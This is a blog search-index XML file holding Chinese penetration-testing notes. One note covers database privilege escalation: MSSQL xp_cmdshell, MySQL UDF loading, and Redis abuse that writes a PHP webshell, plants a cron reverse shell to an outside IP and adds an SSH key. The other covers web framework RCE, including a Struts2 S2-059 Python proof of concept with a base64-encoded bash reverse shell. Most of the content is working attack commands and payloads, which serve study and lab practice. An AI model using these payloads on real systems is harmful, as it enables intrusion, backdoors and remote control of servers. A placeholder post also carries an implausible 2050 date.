<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hello，world！</title>
      <link href="/2050/01/09/nihao/"/>
      <url>/2050/01/09/nihao/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/qm.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库安全</title>
      <link href="/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
      <url>/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="MS-SQL"><a href="#MS-SQL" class="headerlink" title="MS-SQL"></a>MS-SQL</h1><p>通过fscan扫描</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112353066.png" alt="image-20250331112353066"></p><p>得到密码，直接远程连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>“存储过程”：其实质就是一个“集合”，那么是什么样的结合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。 而存储过程中的这些小脚本中，其危险性最高的“小脚本”就是扩展存储过程中的“xp_cmdshell脚本”，它可以执行操作系统的任何指令。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="查看是否有xp-cmdshell"><a href="#查看是否有xp-cmdshell" class="headerlink" title="查看是否有xp_cmdshell"></a>查看是否有xp_cmdshell</h3><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331112530738.png" alt="image-20250331112530738"></p><h3 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>master..xp_cmdshell ‘whoami’;</p><p><strong><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331140936528.png" alt="image-20250331140936528"></strong></p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><h2 id="默认端口：3306"><a href="#默认端口：3306" class="headerlink" title="默认端口：3306"></a>默认端口：3306</h2><p>主要利用前提条件：</p><ol><li>有注入点</li><li>root权限 （sqlmap里面的命令–is-dba参数查看结果）</li><li>获取网站绝对路径<ul><li>fuzz尝试</li><li>构造错误参数</li><li>phpinfo</li><li>配置文件</li><li>@@datadir参数</li></ul></li><li>secure_file_priv&#x3D;<ul><li>secure_file_prive&#x3D; ， 结果为空的话，表示允许任何文件读写</li><li>secure_file_prive&#x3D;NULL， 表示不允许任何文件读写</li><li>secure_file_prive&#x3D;‘某个路径’， 表示这个路径作为文件读写的路径</li></ul></li><li>web目录具有写权限。</li></ol><p>连接时 </p><blockquote><p>注意点！！<strong>mysql-p -P 有区别 -P端口号</strong></p></blockquote><blockquote><p> 如果想导入一个文件到这个绝对路径下：c:\windows\system32\wbem\mof\那么指定的时候绝对路径就需要输入成：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 或者 c:\windows\system32\wbem\mof\</p></blockquote><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><blockquote><p>PS: secure_file_priv&#x3D;</p><p>Mysql5.5版本前，参数值都是默认为空，允许读取</p><p>Mysql5.6版本后 ,默认为NULL，无法用SQL语句对其进行修改。所以这种只能在配置进行修改。</p></blockquote><p>udf的动态链接库文件放到MYSQL的插件目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| plugin_dir    | /usr/local/mysql/lib/plugin/ |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>64位.so</p><h3 id="写入-so文件"><a href="#写入-so文件" class="headerlink" title="写入.so文件"></a><strong>写入.so文件</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure><h3 id="创建恶意函数执行"><a href="#创建恶意函数执行" class="headerlink" title="创建恶意函数执行"></a>创建恶意函数执行</h3><p>create function <strong>sys_eval</strong> returns string SONAME ‘udf.so’;</p><h3 id="执行命令RCE"><a href="#执行命令RCE" class="headerlink" title="执行命令RCE"></a>执行命令RCE</h3><p><strong>select sys_eval(‘id’);</strong></p><h1 id="REDIS数据库安全"><a href="#REDIS数据库安全" class="headerlink" title="REDIS数据库安全"></a>REDIS数据库安全</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331135043052.png" alt="image-20250331135043052"></p><h2 id="端口：6379"><a href="#端口：6379" class="headerlink" title="端口：6379"></a>端口：6379</h2><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1.写webshell"></a>1.写webshell</h3><p><em>当扫描到80端口时，且知道网站目录时可以采用此法。</em></p><p>可以用navicat图形工具，也可以用kali命令</p><p><strong>kali：</strong></p><p>先连接REDIS</p><p><strong>连接时注意host的末尾不能加&#x2F;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">└─# redis-cli -h 10.2.2.10</span><br><span class="line">10.2.2.10:6379&gt; flushall   # 清除所有数据库的所有key</span><br><span class="line">10.2.2.10:6379&gt; set webshell &quot;\n\n\n&lt;?php eval($_REQUEST[1]);?&gt;\n&quot; </span><br><span class="line">10.2.2.10:6379&gt; config set dir /var/www/html   # 指定数据存储的路径</span><br><span class="line">10.2.2.10:6379&gt; config set dbfilename shell.php # 指定数据存储的文件名</span><br><span class="line">10.2.2.10:6379&gt; save # 存储数据</span><br></pre></td></tr></table></figure><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331143432623.png" alt="image-20250331143432623"></p><h3 id="2-写反弹shell"><a href="#2-写反弹shell" class="headerlink" title="2.写反弹shell"></a>2.写反弹shell</h3><p>连接REDIS</p><p>然后本地开启监听</p><p>之后写反弹shell</p><p>10.2.2.10:6379&gt; flushall   # 清除所有数据库的所有key<br>10.2.2.10:6379&gt; set x “\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.109&#x2F;1234 0&gt;&amp;1\n”<br>10.2.2.10:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron   # 指定数据存储的路径<br>10.2.2.10:6379&gt; config set dbfilename root # 指定数据存储的文件名<br>10.2.2.10:6379&gt; save # 存储数据</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331150827811.png" alt="image-20250331150827811"></p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331150606441.png" alt="image-20250331150606441"></p><h3 id="3-写ssh公钥"><a href="#3-写ssh公钥" class="headerlink" title="3.写ssh公钥"></a>3.写ssh公钥</h3><p>ssh-keygen生成密钥</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154025362.png" alt="image-20250331154025362"></p><p>效果</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154115150.png" alt="image-20250331154115150"></p><p>然后连接REDIS之后写入<strong>公钥</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# cat /root/.ssh/id_ed25519.pub </span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICbbV6NUoFzJM1wFiveSsc6R38E1j9tzYyVb10hUpwlf root@kali</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─#redis-cli -h 10.2.2.10</span><br><span class="line">10.2.2.10:6379&gt; get *</span><br><span class="line">10.2.2.10:6379&gt; flushall</span><br><span class="line">10.2.2.10:6379&gt; set x &quot;\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICbbV6NUoFzJM1wFiveSsc6R38E1j9tzYyVb10hUpwlf root@kali\n&quot; </span><br><span class="line">10.2.2.10:6379&gt; config set dir /root/.ssh</span><br><span class="line">10.2.2.10:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">10.2.2.10:6379&gt; save </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后连接，发现无需密码。</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154503413.png" alt="image-20250331154503413"></p><h3 id="4-主从复制"><a href="#4-主从复制" class="headerlink" title="4.主从复制"></a>4.主从复制</h3><p>​主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p><p>Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p><p>编译得到exp.so恶意文件</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331195715024.png" alt="image-20250331195715024"></p><p>运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rogue-server.py --rhost 10.3.4.137 --rport 6379 --lhost 192.168.230.27 --lport 8888</span><br></pre></td></tr></table></figure><p>就连上了</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331195959109.png" alt="image-20250331195959109"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web框架漏洞梳理</title>
      <link href="/2025/03/19/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/03/19/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h2><p>版本：5.0.9</p><p>随便构造请求，得到如下版本号</p><p><img src="/../images/image-20250319145656837.png" alt="image-20250319145656837"></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><img src="/../images/image-20250319150048616.png" alt="image-20250319150048616"></p><p>利用此payload发送POST请求rce</p><p>或者利用工具</p><p><img src="/../images/image-20250319151825846.png" alt="image-20250319151825846"></p><h2 id="Struts2-059远程代码执行漏洞利用"><a href="#Struts2-059远程代码执行漏洞利用" class="headerlink" title="Struts2-059远程代码执行漏洞利用"></a>Struts2-059远程代码执行漏洞利用</h2><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p><p>影响版本: Struts 2.0.0 - Struts 2.5.20</p><p><img src="/../images/image-20250319152341032.png" alt="111"></p><p>对百分号进行编码，可执行命令</p><p><strong>反弹shell的POC：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure><p><img src="/../images/web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20250319210818529.png" alt="1"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
